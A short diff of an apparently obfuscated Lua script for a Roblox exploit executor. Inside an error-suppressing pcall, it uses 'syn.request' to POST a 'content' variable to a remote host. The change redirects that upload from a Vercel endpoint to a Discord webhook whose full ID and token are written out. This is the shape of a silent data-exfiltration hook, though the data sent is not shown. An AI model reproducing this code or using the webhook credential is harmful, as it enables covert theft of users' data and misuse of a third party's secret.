@@ -9,7 +9,7 @@ local function L_1_func()
         pcall(function()
             if syn and syn.request then
                 syn.request({
-                    Url = "https://python-hello-world-one-blue.vercel.app/api",
+                    Url = "https://discord.com/api/webhooks/1408152735198613584/4xA1sAgdn7QaCLbngQNCSx7oXqHgarVQeTmd-7cixoAfQXOC828oy7DI7aUPUcuU-u92",
                     Body = content,
                     Method = "POST"
                 })
